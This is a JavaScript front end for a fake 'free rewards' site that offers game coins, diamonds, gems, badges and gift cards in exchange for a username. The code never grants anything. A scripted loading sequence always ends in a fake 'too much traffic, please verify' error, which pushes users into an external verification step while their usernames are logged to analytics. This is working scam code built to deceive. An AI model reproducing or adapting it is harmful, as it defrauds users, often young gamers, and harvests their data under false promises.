// Dynamic App Platform - Core JavaScript
class AppPlatform {
    constructor() {
        this.config = null;
        this.currentApp = null;
        this.currentView = 'drawer';
        this.selectedGift = null;
        this.username = null;
        
        this.init();
    }
    
    async init() {
        await this.loadConfig();
        this.setupEventListeners();
        this.handleDeepLink();
        this.renderApps();
        
        // Track page load
        if (window.analytics) {
            window.analytics.track('page_load', {
                url: window.location.href,
                referrer: document.referrer
            });
        }
    }
    
    async loadConfig() {
        try {
            // Try to load from API
            const response = await fetch('/api/get-config.php?v=<?=time()?>');
            if (response.ok) {
                const data = await response.json();
                this.config = data.success ? data.data : this.getDefaultConfig();
            } else {
                this.config = this.getDefaultConfig();
            }
        } catch (error) {
            console.warn('Failed to load config from API, using default:', error);
            this.config = this.getDefaultConfig();
        }
        
        // Update page title
        if (this.config.global) {
            document.title = this.config.global.siteTitle || 'App Platform';
        }
    }
    
    getDefaultConfig() {
        return {
            global: {
                siteTitle: "App Platform",
                analyticsEnabled: true,
                pwaEnabled: true
            },
            apps: [
                {
                    id: 1,
                    enabled: true,
                    title: "Free Coins",
                    icon: "🪙",
                    usernameLabel: "Enter your username",
                    usernamePlaceholder: "username123",
                    gifts: [
                        { id: "gift1", label: "100 Coins", icon: "🪙", value: "coins_100" },
                        { id: "gift2", label: "500 Coins", icon: "💰", value: "coins_500" },
                        { id: "gift3", label: "1000 Coins", icon: "💎", value: "coins_1000" }
                    ],
                    submitButtonText: "Get Gift",
                    verifyButtonText: "Verify Now",
                    customFunctionName: "app1Verify",
                    loadingMessages: [
                        "Connecting to server...",
                        "Fetching your gift...",
                        "Almost there..."
                    ],
                    errorMessage: "Too much traffic detected! Please complete verification."
                },
                {
                    id: 2,
                    enabled: true,
                    title: "Premium Badge",
                    icon: "⭐",
                    usernameLabel: "Enter your user ID",
                    usernamePlaceholder: "user_id",
                    gifts: [
                        { id: "gift1", label: "Bronze Badge", icon: "🥉", value: "badge_bronze" },
                        { id: "gift2", label: "Silver Badge", icon: "🥈", value: "badge_silver" },
                        { id: "gift3", label: "Gold Badge", icon: "🥇", value: "badge_gold" }
                    ],
                    submitButtonText: "Claim Badge",
                    verifyButtonText: "Complete Verification",
                    customFunctionName: "app2Verify",
                    loadingMessages: [
                        "Processing request...",
                        "Validating account...",
                        "Preparing badge..."
                    ],
                    errorMessage: "Verification required to continue."
                },
                {
                    id: 3,
                    enabled: true,
                    title: "Gift Cards",
                    icon: "🎁",
                    usernameLabel: "Your username",
                    usernamePlaceholder: "enter username",
                    gifts: [
                        { id: "gift1", label: "$10 Gift Card", icon: "💳", value: "card_10" },
                        { id: "gift2", label: "$25 Gift Card", icon: "💳", value: "card_25" },
                        { id: "gift3", label: "$50 Gift Card", icon: "💳", value: "card_50" }
                    ],
                    submitButtonText: "Get Card",
                    verifyButtonText: "Verify",
                    customFunctionName: "app3Verify",
                    loadingMessages: ["Processing..."],
                    errorMessage: "Please verify to claim your gift card."
                },
                {
                    id: 4,
                    enabled: true,
                    title: "Diamonds",
                    icon: "💎",
                    usernameLabel: "Account name",
                    usernamePlaceholder: "your_account",
                    gifts: [
                        { id: "gift1", label: "50 Diamonds", icon: "💎", value: "diamonds_50" },
                        { id: "gift2", label: "100 Diamonds", icon: "💎", value: "diamonds_100" },
                        { id: "gift3", label: "250 Diamonds", icon: "💎", value: "diamonds_250" }
                    ],
                    submitButtonText: "Claim",
                    verifyButtonText: "Verify",
                    customFunctionName: "app4Verify",
                    loadingMessages: ["Loading..."],
                    errorMessage: "Verification needed."
                },
                {
                    id: 5,
                    enabled: true,
                    title: "Gems",
                    icon: "💠",
                    usernameLabel: "Username",
                    usernamePlaceholder: "username",
                    gifts: [
                        { id: "gift1", label: "100 Gems", icon: "💠", value: "gems_100" },
                        { id: "gift2", label: "500 Gems", icon: "💠", value: "gems_500" },
                        { id: "gift3", label: "1000 Gems", icon: "💠", value: "gems_1000" }
                    ],
                    submitButtonText: "Get Gems",
                    verifyButtonText: "Verify",
                    customFunctionName: "app5Verify",
                    loadingMessages: ["Processing..."],
                    errorMessage: "Please complete verification."
                },
                {
                    id: 6,
                    enabled: true,
                    title: "Rewards",
                    icon: "🎉",
                    usernameLabel: "Your ID",
                    usernamePlaceholder: "player_id",
                    gifts: [
                        { id: "gift1", label: "Daily Reward", icon: "🎁", value: "reward_daily" },
                        { id: "gift2", label: "Weekly Reward", icon: "🎁", value: "reward_weekly" },
                        { id: "gift3", label: "Monthly Reward", icon: "🎁", value: "reward_monthly" }
                    ],
                    submitButtonText: "Claim Reward",
                    verifyButtonText: "Verify",
                    customFunctionName: "app6Verify",
                    loadingMessages: ["Loading..."],
                    errorMessage: "Verification required."
                }
            ]
        };
    }
    
    setupEventListeners() {
        // Back button
        const backBtn = document.getElementById('back-btn');
        if (backBtn) {
            backBtn.addEventListener('click', () => this.showView('drawer'));
        }
        
        // Form submission
        const form = document.getElementById('gift-form');
        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleFormSubmit();
            });
        }
        
        // Username input
        const usernameInput = document.getElementById('username');
        if (usernameInput) {
            usernameInput.addEventListener('input', () => this.validateForm());
        }
        
        // Verify button
        const verifyBtn = document.getElementById('verify-btn');
        if (verifyBtn) {
            verifyBtn.addEventListener('click', () => this.handleVerify());
        }
    }
    
    handleDeepLink() {
        const params = new URLSearchParams(window.location.search);
        const appId = params.get('app');
        
        if (appId) {
            const appIdNum = parseInt(appId);
            const app = this.config.apps.find(a => a.id === appIdNum && a.enabled);
            if (app) {
                this.openApp(app);
            }
        }
    }
    
    renderApps() {
        const grid = document.getElementById('apps-grid');
        if (!grid) return;
        
        grid.innerHTML = '';
        
        const enabledApps = this.config.apps.filter(app => app.enabled);
        
        enabledApps.forEach(app => {
            const card = document.createElement('div');
            card.className = 'app-card';
            card.dataset.appId = app.id;
            
            const icon = document.createElement('span');
            icon.className = 'app-icon';
            
            if (app.icon.startsWith('http') || app.icon.startsWith('/') || app.icon.startsWith('assets/')) {
                const img = document.createElement('img');
                img.src = app.icon;
                img.alt = app.title;
                icon.appendChild(img);
            } else {
                icon.textContent = app.icon;
            }
            
            const title = document.createElement('span');
            title.className = 'app-title';
            title.textContent = app.title;
            
            card.appendChild(icon);
            card.appendChild(title);
            
            card.addEventListener('click', () => this.openApp(app));
            
            grid.appendChild(card);
        });
    }
    
    openApp(app) {
        this.currentApp = app;
        
        // Track app selection
        if (window.analytics) {
            window.analytics.track('app_select', {
                app_id: app.id,
                app_title: app.title
            });
        }
        
        // Update form view
        const appTitle = document.getElementById('app-title');
        const usernameLabel = document.getElementById('username-label');
        const usernameInput = document.getElementById('username');
        const submitBtn = document.getElementById('submit-btn');
        
        if (appTitle) appTitle.textContent = app.title;
        if (usernameLabel) usernameLabel.textContent = app.usernameLabel;
        if (usernameInput) usernameInput.placeholder = app.usernamePlaceholder;
        if (submitBtn) submitBtn.textContent = app.submitButtonText;
        
        // Render gifts
        this.renderGifts(app.gifts);
        
        // Reset form
        if (usernameInput) usernameInput.value = '';
        this.selectedGift = null;
        this.validateForm();
        
        // Show form view
        this.showView('form');
    }
    
    renderGifts(gifts) {
        const container = document.getElementById('gifts-container');
        if (!container) return;
        
        container.innerHTML = '';
        
        gifts.forEach(gift => {
            const option = document.createElement('label');
            option.className = 'gift-option';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'gift';
            radio.value = gift.value;
            radio.addEventListener('change', () => {
                this.selectedGift = gift;
                this.validateForm();
            });
            
            const content = document.createElement('div');
            content.className = 'gift-content';
            content.style.display = 'flex';
            content.style.alignItems = 'center';
            content.style.flex = '1';
            
            const icon = document.createElement('span');
            icon.className = 'gift-icon';
            icon.textContent = gift.icon;
            
            const label = document.createElement('span');
            label.className = 'gift-label';
            label.textContent = gift.label;
            
            content.appendChild(icon);
            content.appendChild(label);
            
            option.appendChild(radio);
            option.appendChild(content);
            
            container.appendChild(option);
        });
    }
    
    validateForm() {
        const usernameInput = document.getElementById('username');
        const submitBtn = document.getElementById('submit-btn');
        
        const isValid = usernameInput && usernameInput.value.trim() !== '' && this.selectedGift !== null;
        
        if (submitBtn) {
            submitBtn.disabled = !isValid;
        }
        
        return isValid;
    }
    
    handleFormSubmit() {
        const usernameInput = document.getElementById('username');
        this.username = usernameInput.value.trim();
        
        // Track form submission
        if (window.analytics) {
            window.analytics.track('form_submit', {
                app_id: this.currentApp.id,
                username: this.username,
                gift_selected: this.selectedGift.value
            });
        }
        
        // Show processing view
        this.showView('processing');
        this.simulateProcessing();
    }
    
    simulateProcessing() {
        const loadingState = document.getElementById('loading-state');
        const errorState = document.getElementById('error-state');
        const loadingMessage = document.getElementById('loading-message');
        const errorMessage = document.getElementById('error-message');
        const verifyBtn = document.getElementById('verify-btn');
        
        // Show loading
        if (loadingState) loadingState.classList.add('active');
        if (errorState) errorState.classList.remove('active');
        
        // Cycle through loading messages
        const messages = this.currentApp.loadingMessages || ["Processing..."];
        let messageIndex = 0;
        
        const messageInterval = setInterval(() => {
            if (loadingMessage && messageIndex < messages.length) {
                loadingMessage.textContent = messages[messageIndex];
                messageIndex++;
            }
        }, 1000);
        
        // Show error after delay (2-3 seconds)
        setTimeout(() => {
            clearInterval(messageInterval);
            
            if (loadingState) loadingState.classList.remove('active');
            if (errorState) errorState.classList.add('active');
            if (errorMessage) errorMessage.textContent = this.currentApp.errorMessage;
            if (verifyBtn) verifyBtn.textContent = this.currentApp.verifyButtonText;
        }, 2500);
    }
    
    handleVerify() {
        // Track verification click
        if (window.analytics) {
            window.analytics.track('verify_click', {
                app_id: this.currentApp.id,
                username: this.username,
                gift_selected: this.selectedGift.value
            });
        }
        
        // Execute custom function
        const functionName = this.currentApp.customFunctionName;
        if (window.executeVerification) {
            window.executeVerification(functionName, this.username, this.selectedGift.value);
        } else {
            console.warn(`Verification function ${functionName} not found`);
        }
    }
    
    showView(viewName) {
        // Hide all views
        document.querySelectorAll('.view').forEach(view => {
            view.classList.remove('active');
        });
        
        // Show selected view
        const views = {
            'drawer': 'drawer-view',
            'form': 'form-view',
            'processing': 'processing-view'
        };
        
        const viewId = views[viewName];
        if (viewId) {
            const view = document.getElementById(viewId);
            if (view) {
                view.classList.add('active');
                this.currentView = viewName;
            }
        }
        
        // Update URL for deep linking
        if (viewName === 'form' && this.currentApp) {
            const url = new URL(window.location);
            url.searchParams.set('app', this.currentApp.id);
            window.history.pushState({}, '', url);
        } else if (viewName === 'drawer') {
            const url = new URL(window.location);
            url.searchParams.delete('app');
            window.history.pushState({}, '', url);
        }
    }
}

// Initialize app when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.app = new AppPlatform();
    });
} else {
    window.app = new AppPlatform();
}
